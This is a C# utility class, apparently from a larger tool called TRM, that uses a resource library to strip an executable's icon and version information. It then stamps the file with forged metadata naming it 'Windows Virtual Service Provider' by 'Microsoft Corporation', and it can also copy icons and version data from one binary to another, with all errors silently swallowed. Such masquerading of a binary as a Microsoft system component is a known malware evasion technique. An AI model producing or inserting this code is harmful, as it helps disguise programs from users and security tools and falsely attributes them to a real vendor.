using System;
using System.Collections.Generic;
using Vestris.ResourceLib;

namespace TRM.AppResource;

public static class AlterAppResource
{
	public static void ApplyTrmMainVersionInfo(string filename, bool removeIcon = true)
	{
		GetIconAndVersion(filename, out var firstIcon, out var firstVersion);
		if (firstVersion != null)
		{
			try
			{
				firstVersion.DeleteFrom(filename);
			}
			catch
			{
			}
		}
		if (removeIcon && firstIcon != null)
		{
			try
			{
				firstIcon.DeleteFrom(filename);
			}
			catch
			{
			}
		}
		VersionResource versionResource = new VersionResource();
		versionResource.FileVersion = "1.0.7601.2342";
		versionResource.ProductVersion = "1.0.7601.2342";
		StringFileInfo stringFileInfo = new StringFileInfo();
		versionResource[stringFileInfo.Key] = stringFileInfo;
		StringTable stringTable = new StringTable();
		stringTable.LanguageID = 1033;
		stringTable.CodePage = 1200;
		stringFileInfo.Strings.Add(stringTable.Key, stringTable);
		stringTable["ProductName"] = "Windows Virtual Service Provider";
		stringTable["FileDescription"] = "Windows Virtual Service Provider";
		stringTable["CompanyName"] = "Microsoft Corporation\0";
		stringTable["LegalCopyright"] = "© Microsoft Corporation. All rights reserved.";
		stringTable["ProductVersion"] = $"{versionResource.ProductVersion}\0";
		VarFileInfo varFileInfo = new VarFileInfo();
		versionResource[varFileInfo.Key] = varFileInfo;
		VarTable varTable = new VarTable("Translation");
		varFileInfo.Vars.Add(varTable.Key, varTable);
		varTable[ResourceUtil.USENGLISHLANGID] = 1300;
		if (versionResource.FixedFileInfo != null)
		{
			_ = versionResource.FixedFileInfo.Value.dwFileType;
		}
		try
		{
			versionResource.SaveTo(filename);
		}
		catch (Exception)
		{
		}
	}

	public static void RemoveVersionAndIcon(string filename)
	{
		GetIconAndVersion(filename, out var firstIcon, out var firstVersion);
		if (firstVersion != null)
		{
			try
			{
				firstVersion.DeleteFrom(filename);
			}
			catch
			{
			}
		}
		if (firstIcon != null)
		{
			try
			{
				firstIcon.DeleteFrom(filename);
			}
			catch
			{
			}
		}
	}

	public static void ReplaceIconAndVersion(string srcFile, string destFile)
	{
		GetIconAndVersion(srcFile, out var firstIcon, out var firstVersion);
		GetIconAndVersion(destFile, out var firstIcon2, out var firstVersion2);
		try
		{
			firstIcon2?.DeleteFrom(destFile);
		}
		catch (Exception)
		{
		}
		try
		{
			firstVersion2?.DeleteFrom(destFile);
		}
		catch (Exception)
		{
		}
		try
		{
			firstIcon?.SaveTo(destFile);
		}
		catch (Exception)
		{
		}
		try
		{
			firstVersion?.SaveTo(destFile);
		}
		catch (Exception)
		{
		}
	}

	private static void GetIconAndVersion(string filename, out IconDirectoryResource firstIcon, out VersionResource firstVersion)
	{
		firstIcon = null;
		firstVersion = null;
		try
		{
			using ResourceInfo resourceInfo = new ResourceInfo();
			resourceInfo.Load(filename);
			foreach (KeyValuePair<ResourceId, List<Resource>> resource in resourceInfo.Resources)
			{
				Kernel32.ResourceTypes resourceType;
				try
				{
					resourceType = resource.Key.ResourceType;
				}
				catch (Exception)
				{
					continue;
				}
				if (firstIcon == null && resourceType == Kernel32.ResourceTypes.RT_GROUP_ICON)
				{
					firstIcon = (IconDirectoryResource)resource.Value[0];
				}
				else if (firstVersion == null && resourceType == Kernel32.ResourceTypes.RT_VERSION)
				{
					firstVersion = (VersionResource)resource.Value[0];
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private static VersionResource GetVersion(string filename)
	{
		VersionResource result = null;
		try
		{
			using ResourceInfo resourceInfo = new ResourceInfo();
			resourceInfo.Load(filename);
			foreach (KeyValuePair<ResourceId, List<Resource>> resource in resourceInfo.Resources)
			{
				Kernel32.ResourceTypes resourceType;
				try
				{
					resourceType = resource.Key.ResourceType;
				}
				catch (Exception)
				{
					continue;
				}
				if (resourceType == Kernel32.ResourceTypes.RT_VERSION)
				{
					result = (VersionResource)resource.Value[0];
					return result;
				}
			}
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}
}
